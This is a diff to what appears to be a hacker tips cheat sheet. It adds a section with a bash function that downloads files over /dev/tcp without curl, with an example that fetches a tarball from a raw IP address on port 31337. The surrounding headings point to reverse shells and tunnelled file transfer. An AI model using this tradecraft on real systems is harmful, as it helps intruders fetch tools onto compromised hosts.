@@ -37,6 +37,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [File transfer using screen](#file-transfer-screen)
    1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
    1. [File transfer using HTTP](#http)
+   1. [File transfer without curl](#burl)
    1. [File transfer using WebDAV](#webdav)
 1. [Reverse Shell / Dumb Shell](#reverse-shell)
    1. [Reverse Shells](#reverse-shell)
@@ -832,7 +833,6 @@ sftp -D gs-netcat                                        # Workstation
 ```
 
 <a id="http"></a>
-
 ### 4.iv. File transfer - using HTTP
 
 ```sh
@@ -845,9 +845,24 @@ python -m http.server 8080
 cloudflared tunnel -url localhost:8080
 ```
 
-<a id="webdav"></a>
+<a id="burl"></a>
+### 4.iv. File transfer without curl
 
-### 4.iv. File transfer - using WebDAV
+Using bash, download only:
+```sh
+burl() {
+    IFS=/ read -r proto x host query <<<"$1"
+    exec 3<>"/dev/tcp/${host}/${PORT:-80}"
+    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host}\r\n\r\n" >&3
+    (while read -r l; do echo >&2 "$l"; [[ $l == $'\r' ]] && break; done && cat ) <&3
+    exec 3>&-
+}
+# burl http://ipinfo.io
+# PORT=31337 burl http://37.120.235.188/blah.tar.gz >blah.tar.gz
+```
+
+<a id="webdav"></a>
+### 4.v. File transfer - using WebDAV
 
 On your workstation (e.g. segfault.net) start a Cloudflare-Tunnel and WebDAV:
 ```sh
